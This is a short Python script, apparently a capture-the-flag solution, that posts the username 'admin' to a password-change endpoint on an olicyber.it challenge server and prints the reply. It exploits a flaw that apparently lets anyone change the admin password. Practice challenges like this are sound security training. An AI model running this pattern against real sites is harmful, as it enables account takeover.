import requests

url = 'http://password-changer.challs.olicyber.it/change-password.php'

r = requests.post(url, data={'username':'admin'})
print(r.text)